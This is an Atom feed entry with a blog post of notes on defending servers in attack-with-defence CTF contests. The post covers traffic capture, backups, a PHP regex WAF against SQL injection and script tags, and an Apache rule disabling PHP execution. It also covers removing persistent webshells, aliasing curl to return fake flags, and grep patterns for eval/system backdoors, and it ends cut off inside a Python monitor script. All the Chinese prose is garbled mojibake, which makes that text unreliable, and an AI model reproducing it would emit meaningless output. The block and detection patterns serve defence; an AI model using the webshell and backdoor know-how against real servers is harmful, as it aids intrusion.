    <id>http://zer0yu.github.io/2018/05/24/ctf-awd-note/</id>
    <published>2018-05-24T11:27:47.000Z</published>
    <updated>2018-12-13T15:01:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-AWDæ¨¡å¼"><a href="#0x01-AWDæ¨¡å¼" class="headerlink" title="0x01 AWDæ¨¡å¼"></a>0x01 AWDæ¨¡å¼</h3><p>Attack With Defenceï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯ä½ æ—¢æ˜¯ä¸€ä¸ªhackerï¼Œåˆæ˜¯ä¸€ä¸ªmanagerã€‚<br>æ¯”èµ›å½¢å¼ï¼šä¸€èˆ¬å°±æ˜¯ä¸€ä¸ªsshå¯¹åº”ä¸€ä¸ªwebæœåŠ¡ï¼Œç„¶åflagäº”åˆ†é’Ÿä¸€è½®ï¼Œå„é˜Ÿä¸€èˆ¬éƒ½æœ‰è‡ªå·±çš„åˆå§‹åˆ†æ•°ï¼Œflagè¢«æ‹¿ä¼šè¢«æ‹¿èµ°flagçš„é˜Ÿä¼å‡åˆ†ï¼Œä¸»åŠæ–¹ä¼šå¯¹æ¯ä¸ªé˜Ÿä¼çš„æœåŠ¡è¿›è¡Œcheckï¼Œcheckä¸è¿‡å°±æ‰£åˆ†ï¼Œæ‰£é™¤çš„åˆ†å€¼ç”±æœåŠ¡checkæ­£å¸¸çš„é˜Ÿä¼å‡åˆ†ã€‚</p><h3 id="0x02-å‡ºé¢˜æ€è·¯"><a href="#0x02-å‡ºé¢˜æ€è·¯" class="headerlink" title="0x02 å‡ºé¢˜æ€è·¯"></a>0x02 å‡ºé¢˜æ€è·¯</h3><h4 id="1-é¢˜ç›®ç±»å‹"><a href="#1-é¢˜ç›®ç±»å‹" class="headerlink" title="1:é¢˜ç›®ç±»å‹"></a>1:é¢˜ç›®ç±»å‹</h4><p>  1-å‡ºé¢˜äººè‡ªå·±å†™çš„cmsï¼Œä¸ºäº†æ¶å¿ƒç„¶ååŠ ä¸ªsoã€‚</p><p>  2-å¸¸è§æˆ–è€…ä¸å¸¸è§çš„cmsã€‚</p><p>  3-ä¸€äº›æ¡†æ¶æ¼æ´ï¼Œæ¯”å¦‚phå¸ˆå‚…æŒ–çš„CIè¿™ç§</p><h4 id="2-ä»£ç ç±»å‹"><a href="#2-ä»£ç ç±»å‹" class="headerlink" title="2:ä»£ç ç±»å‹"></a>2:ä»£ç ç±»å‹</h4><p>ç›®å‰æ¥è¯´ï¼Œå›½å†…æ¯”èµ›ä¾æ—§æ˜¯phpå±…å¤šï¼Œå½“ç„¶ä¹Ÿä¼šæœ‰ä¸€äº›åˆ«çš„ï¼Œæ¯”å¦‚pyï¼Œluaè¿™ç§ã€‚</p><h4 id="3-é¢˜ç›®æ¼æ´ç±»å‹"><a href="#3-é¢˜ç›®æ¼æ´ç±»å‹" class="headerlink" title="3:é¢˜ç›®æ¼æ´ç±»å‹"></a>3:é¢˜ç›®æ¼æ´ç±»å‹</h4><p>  1-sqliå±…å¤š</p><p>  2-æ–‡ä»¶åŒ…å«</p><p>  3-å„ç§rce</p><p>  4-æ–‡ä»¶ä¸Šä¼ </p><h4 id="4-å‡ºé¢˜äººæ€è·¯"><a href="#4-å‡ºé¢˜äººæ€è·¯" class="headerlink" title="4:å‡ºé¢˜äººæ€è·¯"></a>4:å‡ºé¢˜äººæ€è·¯</h4><p>ä¸ºäº†ä¸è®©ä½ ä»¬è¿™ç¾¤èµ›æ£æŠŠé¢˜ç§’äº†ï¼Œæˆ‘ç›´æ¥æ”¾ä¸ªæœªå…¬å¼€cmsçš„0dayæŠŠï¼Œç®—äº†ï¼Œè¦ä¸æˆ‘è‡ªå·±åŠ ç‚¹ä¸œè¥¿ã€‚è¯¶ï¼Œç­‰ç­‰ï¼Œè¿™æ ·æ˜¯ä¸æ˜¯æœ‰ç‚¹éš¾äº†ï¼Œå†æ”¾å‡ ä¸ªæ¯”è¾ƒç®€å•çš„æ´æŠŠï¼Œç›´æ¥åœ¨index.phpæˆ–è€…webæ ¹ç›®å½•ä¸‹æ”¾ä¸ªshell?</p><h4 id="5-æ‹¿flagæ–¹å¼"><a href="#5-æ‹¿flagæ–¹å¼" class="headerlink" title="5:æ‹¿flagæ–¹å¼"></a>5:æ‹¿flagæ–¹å¼</h4><p>1-æ˜¯å‘å†…ç½‘ä¸€å°æœºå™¨å‘é€httpè¯·æ±‚ï¼Œè¿”å›è¯·æ±‚ä¸­åŒ…å«flagã€‚</p><p>2-æ˜¯ä¾‹å¦‚/homeç›®å½•ä¸‹æ”¾ç½®flagæ–‡ä»¶ã€‚</p><h3 id="0x03-é˜²å¾¡æŠ€å·§"><a href="#0x03-é˜²å¾¡æŠ€å·§" class="headerlink" title="0x03 é˜²å¾¡æŠ€å·§"></a>0x03 é˜²å¾¡æŠ€å·§</h3><p>1.åˆ†ææµé‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åœ¨æ¯”èµ›æœåŠ¡å™¨ä¸ŠæŠ“å–æµé‡åŒ…</span></span><br><span class="line">sudo tcpdump -s 0 -w flow.pcap port 80</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨scpå†™ä¸ªè„šæœ¬å®æ—¶å°†æµé‡åŒ…æ‹·è´åˆ°æœ¬åœ°ç”¨wiresharkè¿›è¡Œåˆ†æ</p><p>2.åˆ†ææ—¥å¿—</p><p>1).<a href="https://github.com/wupco/weblogger" target="_blank" rel="noopener">weblogger</a></p><p>2).<a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">LogForensics è…¾è®¯å®éªŒå®¤</a></p><p>3).<a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">åŒ—é£é£˜ç„¶@é‡‘ä¹Œç½‘ç»œå®‰å…¨å®éªŒå®¤</a></p><p>4).<a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">ç½‘ç»œIDä¸ºpiaoxçš„å®‰å…¨ä»ä¸šäººå‘˜</a></p><p>5).<a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">ç½‘ç»œIDï¼šSecSky</a></p><p>6).<a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">ç½‘ç»œIDï¼šé¬¼é­…ç¾Šç¾”</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ—¥å¿—åœ°å€</span></span><br><span class="line">/var/<span class="built_in">log</span>/apache2/</span><br><span class="line">/usr/<span class="built_in">local</span>/apache2/logs</span><br><span class="line">/usr/nginx/logs/</span><br></pre></td></tr></table></figure><p>3.æ‰“åŒ…æºç &amp;å¤‡ä»½æ•°æ®åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‰“åŒ…ç›®å½•</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="comment"># è§£åŒ…</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¤‡ä»½æŒ‡å®šçš„å¤šä¸ªæ•°æ®åº“</span></span><br><span class="line">mysqldump -u root -p --databases choose <span class="built_in">test</span> &gt; /tmp/db.sql</span><br><span class="line"><span class="comment"># æ¢å¤å¤‡ä»½ï¼Œåœ¨mysqlç»ˆç«¯ä¸‹æ‰§è¡Œï¼š</span></span><br><span class="line"><span class="comment"># å‘½ä»¤æ ¼å¼ï¼šsource FILE_PATH</span></span><br><span class="line"><span class="built_in">source</span> ~/db.sql</span><br><span class="line"><span class="comment"># æ›¾ç»é‡åˆ°ä¸€ä¸ªå¤‡ä»½æœ‰é—®é¢˜å¯ä»¥æ‰§è¡Œä¸‹é¢</span></span><br><span class="line">mysqldump -u root --all-databases â€”skip-lock-tables &gt; /tmp/db.sql</span><br><span class="line"><span class="comment"># é‡ç½®mysqlå¯†ç </span></span><br><span class="line"><span class="comment"># æ–¹æ³•1ï¼šç”¨SET PASSWORDå‘½ä»¤  </span></span><br><span class="line">mysql&gt; <span class="built_in">set</span> password <span class="keyword">for</span> ç”¨æˆ·å@localhost = password(<span class="string">'æ–°å¯†ç '</span>);</span><br><span class="line"><span class="comment"># æ–¹æ³•2ï¼šç”¨mysqladmin </span></span><br><span class="line">mysqladmin -uç”¨æˆ·å -pæ—§å¯†ç  password æ–°å¯†ç </span><br></pre></td></tr></table></figure><p>4.é‡ç½®sshå¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sshç™»å½•åæ‰§è¡Œ</span></span><br><span class="line">passwd</span><br></pre></td></tr></table></figure><p>5.éƒ¨ç½²waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Code By Safe3 </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span><span class="params">($errno, $errstr, $errfile, $errline)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"> <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Error number:&lt;/b&gt; [$errno],error on line $errline in $errfile&lt;br /&gt;"</span>;</span><br><span class="line"> <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">set_error_handler(<span class="string">"customError"</span>,E_ERROR);</span><br><span class="line">$getfilter=<span class="string">"'|(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$postfilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line">$cookiefilter=<span class="string">"\\b(and|or)\\b.&#123;1,6&#125;?(=|&gt;|&lt;|\\bin\\b|\\blike\\b)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">StopAttack</span><span class="params">($StrFiltKey,$StrFiltValue,$ArrFiltReq)</span></span>&#123;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_array($StrFiltValue))</span><br><span class="line">&#123;</span><br><span class="line">    $StrFiltValue=implode($StrFiltValue);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrFiltReq.<span class="string">"/is"</span>,$StrFiltValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="comment">//slog("&lt;br&gt;&lt;br&gt;æ“ä½œIP: ".$_SERVER["REMOTE_ADDR"]."&lt;br&gt;æ“ä½œæ—¶é—´: ".strftime("%Y-%m-%d %H:%M:%S")."&lt;br&gt;æ“ä½œé¡µé¢:".$_SERVER["PHP_SELF"]."&lt;br&gt;æäº¤æ–¹å¼: ".$_SERVER["REQUEST_METHOD"]."&lt;br&gt;æäº¤å‚æ•°: ".$StrFiltKey."&lt;br&gt;æäº¤æ•°æ®: ".$StrFiltValue);</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"360websec notice:Illegal operation!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">&#125;      </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//$ArrPGC=array_merge($_GET,$_POST,$_COOKIE);</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$getfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$postfilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_COOKIE <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    StopAttack($key,$value,$cookiefilter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (file_exists(<span class="string">'update360.php'</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"è¯·é‡å‘½åæ–‡ä»¶update360.phpï¼Œé˜²æ­¢é»‘å®¢åˆ©ç”¨&lt;br/&gt;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">slog</span><span class="params">($logs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  $toppath=$_SERVER[<span class="string">"DOCUMENT_ROOT"</span>].<span class="string">"/log.htm"</span>;</span><br><span class="line">  $Ts=fopen($toppath,<span class="string">"a+"</span>);</span><br><span class="line">  fputs($Ts,$logs.<span class="string">"\r\n"</span>);</span><br><span class="line">  fclose($Ts);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–¹æ³•ï¼š<br>(1).å°†waf.phpä¼ åˆ°è¦åŒ…å«çš„æ–‡ä»¶çš„ç›®å½•<br>(2).åœ¨é¡µé¢ä¸­åŠ å…¥é˜²æŠ¤ï¼Œæœ‰ä¸¤ç§åšæ³•ï¼Œæ ¹æ®æƒ…å†µäºŒé€‰ä¸€å³å¯ï¼š<br>a).åœ¨æ‰€éœ€è¦é˜²æŠ¤çš„é¡µé¢åŠ å…¥ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once(&apos;waf.php&apos;);</span><br></pre></td></tr></table></figure><p>å°±å¯ä»¥åšåˆ°é¡µé¢é˜²æ³¨å…¥ã€è·¨ç«™<br>å¦‚æœæƒ³æ•´ç«™é˜²æ³¨ï¼Œå°±åœ¨ç½‘ç«™çš„ä¸€ä¸ªå…¬ç”¨æ–‡ä»¶ä¸­ï¼Œå¦‚æ•°æ®åº“é“¾æ¥æ–‡ä»¶config.inc.phpä¸­ï¼<br>æ·»åŠ require_once(â€˜waf.phpâ€™);æ¥è°ƒç”¨æœ¬ä»£ç <br>å¸¸ç”¨phpç³»ç»Ÿæ·»åŠ æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2   \config\config_global.php</span><br><span class="line">Wordpress   \wp-config.php</span><br><span class="line">Metinfo   \include\head.php</span><br></pre></td></tr></table></figure><p>b).åœ¨æ¯ä¸ªæ–‡ä»¶æœ€å‰åŠ ä¸Šä»£ç <br>åœ¨php.iniä¸­æ‰¾åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Automatically add files before or after any PHP document.</span><br><span class="line">auto_prepend_file = 360_safe3.phpè·¯å¾„;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéƒ¨ç½²wafå¯èƒ½ä¼šå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ï¼Œéœ€è¦è°¨æ…éƒ¨ç½²ã€‚</p><p>å¦‚æœä¸èƒ½éƒ¨ç½²wafæˆ‘ä»¬å¯ä»¥ç®€å•çš„å†™ä¸ªapacheé…ç½®æ–‡ä»¶æ¥ç¦æ­¢PHPæ‰§è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;/var/www/html/&quot;&gt;</span><br><span class="line">Options -ExecCGI -Indexes</span><br><span class="line">AllowOverride None</span><br><span class="line">RemoveHandler .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">RemoveType .php .phtml .php3 .pht .php4 .php5 .php7 .shtml</span><br><span class="line">php_flag engine off</span><br><span class="line">&lt;FilesMatch &quot;.+\.ph(p[3457]?|t|tml)$&quot;&gt;</span><br><span class="line"> deny from all</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure><p>6.å¹²æ‰ä¸æ­»é©¬çš„æ–¹å¼</p><p>(1).<code>ps auxww|grep shell.php</code> æ‰¾åˆ°pidåæ€æ‰è¿›ç¨‹å°±å¯ä»¥ï¼Œä½ åˆ æ‰è„šæœ¬æ˜¯èµ·ä¸äº†ä½œç”¨çš„ï¼Œå› ä¸ºphpæ‰§è¡Œçš„æ—¶å€™å·²ç»æŠŠè„šæœ¬è¯»è¿›å»è§£é‡Šæˆopcodeè¿è¡Œäº†</p><p>(2).é‡å¯phpç­‰webæœåŠ¡</p><p>(3).ç”¨ä¸€ä¸ªignore_user_abort(true)è„šæœ¬ï¼Œä¸€ç›´ç«äº‰å†™å…¥ï¼ˆæ–­æ–­ç»­ç»­ï¼‰ã€‚usleepè¦ä½äºå¯¹æ–¹ä¸æ­»é©¬è®¾ç½®çš„å€¼ã€‚</p><p>(4).åˆ›å»ºä¸€ä¸ªå’Œä¸æ­»é©¬ç”Ÿæˆçš„é©¬ä¸€æ ·åå­—çš„æ–‡ä»¶å¤¹ã€‚</p><p>7.ä¿®æ”¹curlå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">alias</span> curl=<span class="string">'echo fuckoff'</span>  <span class="comment">#æƒé™è¦æ±‚è¾ƒä½</span></span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line"><span class="built_in">alias</span> curl=<span class="string">'python -c "__import__(\"sys\").stdout.write(\"flag&#123;%s&#125;\\n\" % (__import__(\"hashlib\").md5(\"\".join([__import__(\"random\").choice(__import__(\"string\").letters) for i in range(0x10)])).hexdigest()))"'</span></span><br><span class="line">chmod -x curl  <span class="comment">#æƒé™è¦æ±‚è¾ƒé«˜</span></span><br><span class="line">/usr/bin  curlè·¯å¾„</span><br></pre></td></tr></table></figure><p>8.ç”¨Dç›¾æ‰«ææºä»£ç åˆ é™¤åé—¨æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç®€å•çš„æŸ¥æ‰¾åé—¨</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'eval('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'assert('</span></span><br><span class="line">find . -name <span class="string">'*.php'</span> | xargs grep -n <span class="string">'system('</span></span><br></pre></td></tr></table></figure><p>9.æŸ¥æ‰¾å¸¸è§å¤‡ä»½æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¾‹å¦‚bakæ–‡ä»¶</span></span><br><span class="line">find / -name <span class="string">"*.bak"</span></span><br></pre></td></tr></table></figure><p>10.é‡ç½®webçš„å„ç§ç™»å½•å¯†ç ï¼ˆå¦‚æœæ¯”èµ›checkè®¤ä¸ºä¿®æ”¹å¯†ç ç®—downå°±ä¸è¦ä¿®æ”¹äº†ï¼‰</p><p>11.å°†<code>uploads</code>ç­‰æ–‡ä»¶å¤¹ä½¿ç”¨<code>chattr</code>å¯¹æ–‡ä»¶åº•å±‚å±æ€§è¿›è¡Œæ§åˆ¶ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">chattrå‘½ä»¤çš„ç”¨æ³•ï¼šchattr [ -RVf ] [ -v version ] [ mode ] filesâ€¦</span><br><span class="line">æœ€å…³é”®çš„æ˜¯åœ¨[mode]éƒ¨åˆ†ï¼Œ[mode]éƒ¨åˆ†æ˜¯ç”±+-=å’Œ[ASacDdIijsTtu]è¿™äº›å­—ç¬¦ç»„åˆçš„ï¼Œè¿™éƒ¨åˆ†æ˜¯ç”¨æ¥æ§åˆ¶æ–‡ä»¶çš„</span><br><span class="line">å±æ€§ã€‚</span><br><span class="line"></span><br><span class="line">+ ï¼šåœ¨åŸæœ‰å‚æ•°è®¾å®šåŸºç¡€ä¸Šï¼Œè¿½åŠ å‚æ•°ã€‚</span><br><span class="line">- ï¼šåœ¨åŸæœ‰å‚æ•°è®¾å®šåŸºç¡€ä¸Šï¼Œç§»é™¤å‚æ•°ã€‚</span><br><span class="line">= ï¼šæ›´æ–°ä¸ºæŒ‡å®šå‚æ•°è®¾å®šã€‚</span><br><span class="line">Aï¼šæ–‡ä»¶æˆ–ç›®å½•çš„ atime (access time)ä¸å¯è¢«ä¿®æ”¹(modified), å¯ä»¥æœ‰æ•ˆé¢„é˜²ä¾‹å¦‚æ‰‹æç”µè„‘ç£ç›˜I/Oé”™è¯¯çš„å‘ç”Ÿã€‚</span><br><span class="line">Sï¼šç¡¬ç›˜I/OåŒæ­¥é€‰é¡¹ï¼ŒåŠŸèƒ½ç±»ä¼¼syncã€‚</span><br><span class="line">aï¼šå³appendï¼Œè®¾å®šè¯¥å‚æ•°åï¼Œåªèƒ½å‘æ–‡ä»¶ä¸­æ·»åŠ æ•°æ®ï¼Œè€Œä¸èƒ½åˆ é™¤ï¼Œå¤šç”¨äºæœåŠ¡å™¨æ—¥å¿—æ–‡ä»¶å®‰å…¨ï¼Œåªæœ‰rootæ‰èƒ½è®¾å®šè¿™ä¸ªå±æ€§ã€‚</span><br><span class="line">cï¼šå³compresseï¼Œè®¾å®šæ–‡ä»¶æ˜¯å¦ç»å‹ç¼©åå†å­˜å‚¨ã€‚è¯»å–æ—¶éœ€è¦ç»è¿‡è‡ªåŠ¨è§£å‹æ“ä½œã€‚</span><br><span class="line">dï¼šå³no dumpï¼Œè®¾å®šæ–‡ä»¶ä¸èƒ½æˆä¸ºdumpç¨‹åºçš„å¤‡ä»½ç›®æ ‡ã€‚</span><br><span class="line">iï¼šè®¾å®šæ–‡ä»¶ä¸èƒ½è¢«åˆ é™¤ã€æ”¹åã€è®¾å®šé“¾æ¥å…³ç³»ï¼ŒåŒæ—¶ä¸èƒ½å†™å…¥æˆ–æ–°å¢å†…å®¹ã€‚iå‚æ•°å¯¹äºæ–‡ä»¶ ç³»ç»Ÿçš„å®‰å…¨è®¾ç½®æœ‰å¾ˆå¤§å¸®åŠ©ã€‚</span><br><span class="line">jï¼šå³journalï¼Œè®¾å®šæ­¤å‚æ•°ä½¿å¾—å½“é€šè¿‡mountå‚æ•°ï¼šdata=ordered æˆ–è€… data=writeback æŒ‚ è½½çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ–‡ä»¶åœ¨å†™å…¥æ—¶ä¼šå…ˆè¢«è®°å½•(åœ¨journalä¸­)ã€‚å¦‚æœfilesystemè¢«è®¾å®šå‚æ•°ä¸º data=journalï¼Œåˆ™è¯¥å‚æ•°è‡ªåŠ¨å¤±æ•ˆã€‚</span><br><span class="line">sï¼šä¿å¯†æ€§åœ°åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼Œå³ç¡¬ç›˜ç©ºé—´è¢«å…¨éƒ¨æ”¶å›ã€‚</span><br><span class="line">uï¼šä¸sç›¸åï¼Œå½“è®¾å®šä¸ºuæ—¶ï¼Œæ•°æ®å†…å®¹å…¶å®è¿˜å­˜åœ¨ç£ç›˜ä¸­ï¼Œå¯ä»¥ç”¨äºundeletionã€‚</span><br><span class="line">å„å‚æ•°é€‰é¡¹ä¸­å¸¸ç”¨åˆ°çš„æ˜¯aå’Œiã€‚aé€‰é¡¹å¼ºåˆ¶åªå¯æ·»åŠ ä¸å¯åˆ é™¤ï¼Œå¤šç”¨äºæ—¥å¿—ç³»ç»Ÿçš„å®‰å…¨è®¾å®šã€‚è€Œiæ˜¯æ›´ä¸ºä¸¥æ ¼çš„å®‰å…¨è®¾å®šï¼Œåªæœ‰superuser (root) æˆ–å…·æœ‰CAP_LINUX_IMMUTABLEå¤„ç†èƒ½åŠ›ï¼ˆæ ‡è¯†ï¼‰çš„è¿›ç¨‹èƒ½å¤Ÿæ–½åŠ è¯¥é€‰é¡¹ã€‚</span><br><span class="line"></span><br><span class="line">åº”ç”¨ä¸¾ä¾‹ï¼š</span><br><span class="line"></span><br><span class="line">ç”¨chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹ï¼š</span><br><span class="line"><span class="comment"># chattr +i /etc/resolv.conf</span></span><br></pre></td></tr></table></figure><p>12.éƒ¨ç½²æ–‡ä»¶ç›‘æ§ï¼Œå¦‚æœå‘ç°æ–°ä¸Šä¼ æ–‡ä»¶æˆ–è€…æ–‡ä»¶è¢«ä¿®æ”¹ç«‹å³æ¢å¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 